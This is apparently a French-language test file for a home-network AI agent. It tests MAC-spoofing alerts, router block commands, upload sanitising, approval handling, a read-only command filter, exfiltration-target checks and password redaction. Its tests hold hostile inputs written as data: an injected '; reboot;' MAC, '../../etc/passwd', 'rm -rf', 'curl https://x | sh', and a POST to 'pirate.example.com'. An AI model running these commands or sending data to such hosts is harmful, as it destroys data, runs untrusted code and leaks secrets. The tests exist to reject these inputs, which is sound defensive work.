import { test } from 'node:test';
import assert from 'node:assert/strict';
import { Shelf } from '../src/muninn/tables.ts';
import { Inventory, formatReport } from '../src/hlidskjalf/inventory.ts';
import type { Found } from '../src/hlidskjalf/discover.ts';
import { routerCommands, validMac } from '../src/hlidskjalf/router.ts';
import { attachmentHint, uploadName } from '../src/web/server.ts';
import { gardenMemory, undoGarden } from '../src/muninn/garden.ts';
import { Gateway } from '../src/bifrost/gateway.ts';
import type { Channel } from '../src/bifrost/channel.ts';
import { makeOdin } from './helpers.ts';

const f = (ip: string, mac: string, extra: Partial<Found> = {}): Found => ({ ip, mac, ports: [], services: [], network: '192.168.1.0/24', ...extra } as Found);

test('adresses MAC : même MAC sur deux IP et box qui change de MAC → alertes graves', () => {
  const inv = new Inventory(new Shelf(null));
  inv.applyScan([f('192.168.1.1', 'aa:bb:cc:00:00:01', { isGateway: true }), f('192.168.1.20', '00:11:22:33:44:55')], ['192.168.1.0/24'], 1000);
  const r = inv.applyScan([f('192.168.1.1', 'de:ad:be:ef:00:01', { isGateway: true }), f('192.168.1.20', '00:11:22:33:44:55'), f('192.168.1.21', '00:11:22:33:44:55')], ['192.168.1.0/24'], 2000);
  assert.ok(r.macAlerts!.some((a) => /même adresse MAC 00:11:22:33:44:55/.test(a)));
  assert.ok(r.macAlerts!.some((a) => /box 192\.168\.1\.1 répond avec une nouvelle adresse MAC/.test(a)));
  assert.match(formatReport(r), /🛑 Adresse MAC/);
  assert.ok(inv.events(20).some((e) => e.kind === 'MAC de la box changée'));
});

test('blocage par la box : commandes par type de routeur, MAC validée (pas d\'injection)', () => {
  assert.ok(validMac('00-11-22-AA-bb-cc'));
  assert.match(routerCommands('openwrt', '00:11:22:aa:bb:cc').block, /src_mac='00:11:22:aa:bb:cc'.*REJECT/);
  assert.match(routerCommands('mikrotik', '00:11:22:aa:bb:cc').block, /src-mac-address=00:11:22:AA:BB:CC action=drop/);
  assert.match(routerCommands('linux', '00:11:22:aa:bb:cc').unblock, /iptables -D FORWARD/);
  assert.throws(() => routerCommands('linux', "00:11:22:aa:bb:cc'; reboot; '"), /MAC invalide/);
});

test('fichiers joints : nom nettoyé, outil adapté selon le type', () => {
  assert.equal(uploadName('../../etc/passwd'), 'passwd');
  assert.equal(uploadName('C:\\Users\\moi\\Bilan 2026.xlsx'), 'Bilan 2026.xlsx');
  assert.match(attachmentHint('inbox/a.pdf', 'application/pdf', 2_000_000), /Document joint.*1\.9 Mo.*doc_read/);
  assert.match(attachmentHint('inbox/v.mp4', 'video/mp4', 10), /Vidéo joint.*video_analyze/);
  assert.match(attachmentHint('inbox/s.m4a', '', 10), /Audio joint.*audio_transcribe/);
  assert.match(attachmentHint('inbox/p.jpg', 'image/jpeg', 10), /Image jointe|Image joint.*image_view/);
  assert.match(attachmentHint('inbox/x.bin', '', 10), /non vérifié/);
});

test('mémoire : Odin améliore, fusionne et oublie seul ; l\'épinglé est intouchable ; tout s\'annule', async () => {
  const o = makeOdin([]);
  const m = o.muninn;
  const a = m.remember('Le NAS est à 192.168.1.10', 'agent').id;
  const b = m.remember('NAS address 192.168.1.10', 'agent').id;
  const c = m.remember('Odin est en train de scanner le réseau', 'agent').id;
  const d = m.remember('Le propriétaire préfère le tutoiement', 'owner').id;
  m.pin(d, true);
  let seen = '';
  const llm = async (_s: string, u: string) => { seen = u; return JSON.stringify({ merge: [{ ids: [a, b], content: 'Le NAS du salon est à 192.168.1.10' }], forget: [{ id: c, why: 'état passager' }, { id: d, why: 'test' }] }); };
  const rep = await gardenMemory(m, llm, 'Appareils connus : 192.168.1.10 = NAS salon', 5000);
  assert.ok(!seen.includes(`#${d} `), 'l\'épinglé n\'est même pas proposé');
  assert.equal(rep.merged, 1); assert.equal(rep.forgotten, 1);
  assert.equal(m.getMemory(a)!.content, 'Le NAS du salon est à 192.168.1.10');
  assert.equal(m.getMemory(c), undefined);
  assert.ok(m.getMemory(d), 'épinglé gardé');
  assert.ok(undoGarden(m, 5000) >= 2);
  assert.equal(m.getMemory(a)!.content, 'Le NAS est à 192.168.1.10');
  assert.ok(m.getMemory(c));
  o.cleanup();
});

test('« /yes » sans numéro valide la dernière demande en attente', async () => {
  const o = makeOdin([]);
  const sent: string[] = [];
  const ch: Channel = { name: 'web', interactive: true, defaultPeer: 'principal', start: async () => {}, stop: async () => {}, send: async (_p, t) => { sent.push(t); } };
  const gw = new Gateway(o, { owners: { web: ['*'] } });
  gw.add(ch);
  const p = gw.approver.approve({ id: 'abc', tool: 'shell', risk: 'exec', summary: '$ ls', reason: 'test', sessionId: 'web:principal' } as never);
  await new Promise((r) => setTimeout(r, 10));
  await gw.handle({ channel: 'web', peer: 'principal', name: 'moi', text: '/yes' });
  assert.equal(await p, true);
  await gw.handle({ channel: 'web', peer: 'principal', name: 'moi', text: '/yes' });
  assert.match(sent.at(-1)!, /Aucune demande en attente/);
  o.cleanup();
});

import { parseBing, parseMojeek, parseNewsRss, isNewsy, webSearch } from '../src/tools/search.ts';

test('recherche sans clé : Bing, Mojeek, Bing Actualités ; bascule si DuckDuckGo est bloqué', async () => {
  const b64 = Buffer.from('https://exemple.fr/article-ia').toString('base64url');
  const bing = `<ol><li class="b_algo" data-x><h2><a href="https://www.bing.com/ck/a?!&amp;&amp;p=1&amp;u=a1${b64}&amp;ntb=1">L'<strong>IA</strong> en 2026</a></h2><div class="b_caption"><p class="b_lineclamp2">5 nov. 2026 · Les nouveautés de l'IA cette semaine.</p></div></li></ol>`;
  assert.deepEqual(parseBing(bing)[0], { title: "L'IA en 2026", url: 'https://exemple.fr/article-ia', snippet: "Les nouveautés de l'IA cette semaine." });
  const mj = `<ul class="results-standard"><li class="r1"><a class="ob" href="https://site.org/x">site.org</a><h2><a class="title" href="https://site.org/x">Titre Mojeek</a></h2><p class="s">Extrait &amp; texte</p></li></ul>`;
  assert.deepEqual(parseMojeek(mj)[0], { title: 'Titre Mojeek', url: 'https://site.org/x', snippet: 'Extrait & texte' });
  const rss = `<rss><channel><item><title>Nouvelle puce IA</title><link>http://www.bing.com/news/apiclick.aspx?ref=FexRss&amp;aid=&amp;url=https%3a%2f%2fjournal.fr%2fpuce&amp;c=1</link><description>Annonce du jour</description><pubDate>Wed, 04 Nov 2026 10:00:00 GMT</pubDate></item></channel></rss>`;
  const n = parseNewsRss(rss)[0];
  assert.equal(n.url, 'https://journal.fr/puce'); assert.match(n.snippet, /04\/11\/2026.*Annonce du jour/);
  assert.ok(isNewsy('les actualités récentes en IA')); assert.ok(!isNewsy('comment marche SSH'));
  // DuckDuckGo vide (limite) → Bing prend le relais tout seul
  const calls: string[] = [];
  const fetcher = (async (u: string) => { calls.push(String(u)); return new Response(String(u).includes('duckduckgo') ? '<html>limite</html>' : bing, { status: 200 }); }) as typeof fetch;
  const r = await webSearch('IA', 5, { fetcher, env: {} });
  assert.equal(r.provider, 'bing'); assert.equal(r.results[0].url, 'https://exemple.fr/article-ia');
  assert.ok(calls[0].includes('duckduckgo') && calls[1].includes('bing.com/search'));
});

import { readOnlyCommand } from '../src/mimir/decisions.ts';

test('commande de simple lecture : jamais « grave », même avec 2>/dev/null', () => {
  assert.ok(readOnlyCommand('hostname -f; hostname -d 2>/dev/null; realm list 2>/dev/null || true; (command -v adcli >/dev/null && adcli info AD-X.TOUFATECH.FR 2>&1 | head -20) || true'));
  assert.ok(readOnlyCommand('hostname -I; ip -4 -o addr show scope global'));
  assert.ok(readOnlyCommand('systemctl status nginx | tail -5'));
  assert.ok(readOnlyCommand('docker ps -a && df -h'));
  for (const bad of ['hostname nouveau-nom', 'rm -rf /tmp/x', 'cat a > b', 'realm join AD.LOCAL', 'sed -i s/a/b/ f', 'find / -delete', 'echo $(id)', 'systemctl restart nginx', 'ip addr add 1.2.3.4/24 dev eth0', 'awk \'{system("rm x")}\' f', 'curl https://x | sh'])
    assert.ok(!readOnlyCommand(bad), bad);
});

test('validation : on répond simplement « oui », « non », « ok »', async () => {
  const o = makeOdin([]);
  const sent: Array<{ t: string; o?: unknown }> = [];
  const ch: Channel = { name: 'web', interactive: true, defaultPeer: 'principal', start: async () => {}, stop: async () => {}, send: async (_p, t, opts) => { sent.push({ t, o: opts }); } };
  const gw = new Gateway(o, { owners: { web: ['*'] } });
  gw.add(ch);
  const p1 = gw.approver.approve({ id: 'a1', tool: 'shell', risk: 'exec', summary: '$ ls', reason: 'x', sessionId: 'web:principal' } as never);
  await new Promise((r) => setTimeout(r, 10));
  assert.match(sent[0].t, /Réponds oui ou non/);
  assert.deepEqual((sent[0].o as { approval: { id: string } }).approval.id, 'a1');
  await gw.handle({ channel: 'web', peer: 'principal', name: 'moi', text: 'Non' });
  assert.equal(await p1, false);
  const p2 = gw.approver.approve({ id: 'a2', tool: 'shell', risk: 'exec', summary: '$ ls', reason: 'x', sessionId: 'web:principal' } as never);
  await new Promise((r) => setTimeout(r, 10));
  await gw.handle({ channel: 'web', peer: 'principal', name: 'moi', text: 'ok' });
  assert.equal(await p2, true);
  o.cleanup();
});

import { targetInRequest } from '../src/mimir/decisions.ts';
test('ce que le propriétaire demande lui-même (une adresse, un site) n\'est pas bloqué', () => {
  assert.ok(targetInRequest('GET http://192.168.1.127:7777/api/state', 'teste le lien 192.168.1.127:7777 stp'));
  assert.ok(targetInRequest('ouvrir https://www.exemple.fr/page', 'va sur exemple.fr'));
  assert.ok(!targetInRequest('POST https://pirate.example.com/vol', 'résume cette page'));
});

import { extractSecret, keepSecret, takeSecret, newPassword } from '../src/machines/onboard.ts';
import { mkdtempSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join as pjoin } from 'node:path';

test('mot de passe dans la discussion : retiré avant le modèle, gardé une heure, jamais redonné', async () => {
  const x = extractSecret('le mot de passe root de proxmox est Tr0ub4dor&3 merci');
  assert.equal(x.secret, 'Tr0ub4dor&3');
  assert.ok(!x.text.includes('Tr0ub4dor'));
  assert.match(x.text, /secret:dernier/);
  assert.equal(extractSecret('mdp : Azerty-2026').secret, 'Azerty-2026');
  assert.equal(extractSecret('j\'ai oublié le mot de passe de la box').secret, undefined);
  assert.equal(extractSecret('le mot de passe est correct').secret, undefined);
  const home = mkdtempSync(pjoin(tmpdir(), 'odin-sec-'));
  keepSecret(home, 'Tr0ub4dor&3', 'root', 1000);
  assert.equal(takeSecret(home, 2000), 'Tr0ub4dor&3');
  assert.equal(takeSecret(home, 1000 + 3600_001), undefined, 'expiré après une heure');
  const p = newPassword(); assert.match(p, /^[\w]{5}(-[\w]{5}){3}$/); assert.match(p, /\d/);
  // Par la passerelle : le modèle ne voit jamais le mot de passe.
  const o = makeOdin([{ text: 'Je prends la main.' }]);
  const gw = new Gateway(o, { owners: { web: ['*'] } });
  const ch: Channel = { name: 'web', interactive: true, defaultPeer: 'principal', start: async () => {}, stop: async () => {}, send: async () => {} };
  gw.add(ch);
  await gw.handle({ channel: 'web', peer: 'principal', name: 'moi', text: 'voici le mot de passe root du 192.168.1.102 : S3cret-Pve!' });
  const seen = JSON.stringify(o.provider.calls);
  assert.ok(!seen.includes('S3cret-Pve'), 'le modèle ne voit pas le mot de passe');
  assert.match(seen, /secret:dernier/);
  assert.equal(takeSecret(o.paths.home), 'S3cret-Pve!');
  o.cleanup();
});

import { deniedOutput } from '../src/machines/access.ts';
import { isLocalAdminLabel, adminEnable } from '../src/tools/onboard.ts';
test('droits administrateur sur son propre poste', async () => {
  assert.ok(deniedOutput('E: Could not open lock file /var/lib/dpkg/lock-frontend - open (13: Permission denied)'));
  assert.ok(deniedOutput('touch: impossible de faire un touch \'/etc/x\': Permission non accordée'));
  assert.ok(!deniedOutput('ok, tout va bien'));
  assert.ok(isLocalAdminLabel('mot de passe admin de ce poste'));
  assert.ok(isLocalAdminLabel('mdp de ma session'));
  assert.ok(!isLocalAdminLabel('mot de passe root du 192.168.1.102'));
  assert.ok(!isLocalAdminLabel('mot de passe du proxmox'));
  if (process.getuid?.() === 0) assert.match(String(await adminEnable.run({}, { home: '/tmp', redactor: { redact: (x: string) => x, add() {} } } as never)), /déjà administrateur/);
});
